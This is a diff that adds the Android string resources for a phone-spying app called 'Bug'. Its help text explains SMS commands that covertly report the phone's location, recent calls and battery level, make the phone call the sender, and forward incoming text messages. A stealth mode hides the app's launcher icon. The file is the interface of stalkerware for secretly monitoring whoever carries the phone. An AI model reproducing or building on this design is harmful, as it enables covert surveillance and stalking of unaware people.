@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="hello">Hello World, MicrospiaActivity!</string>
+    <string name="app_name">Bug</string>
+    <string name="btn_stealt">Enable stealth mode</string>
+    <string name="homepage">"Bug activated.\n\nUSE:\nSend an SMS with the following commands:\nposizione: returns a text message with a link to Google maps to display the current location.\nchiamami: call the sender automatically\nstato: returns an SMS with the level of battery charge.\nchiamate: returns a text message containing a list of the last three calls made or received.\inoltro on: start forwarding text messages received to the sender of the command\ninoltro off: disable forwarding of SMS\n\nPress the Home key to return to the Launcher\n\n *** Stealth Mode ***\nAllows you to remove the icon from the launcher, making it invisible at first sight. The app is still present in the list of installed programs.\n"</string>
+    <string name="gps_dialog_title">GPS Off</string>
+    <string name="impostazioni_button">Settings</string>
+    <string name="gps_dialog_text">"The GPS should be enabled to use the tracking capabilities."</string>
+    <string name="application_hidden">Application hidden</string>
+    <string name="restart_needed">&quot;The application icon is hidden. You must restart the phone to complete the operation.&quot;</string>
+    <string name="back_home">&quot;Back to Home&quot;</string>
+    <string name="stealth_confirm">&quot;If you enable the stealth mode the icon is no longer visible: to restore it will need to uninstall and reinstall the app.\nDo you want to continue?&quot;</string>
+    <string name="hiding_toast">&quot;Hide icon...&quot;</string>
+</resources>
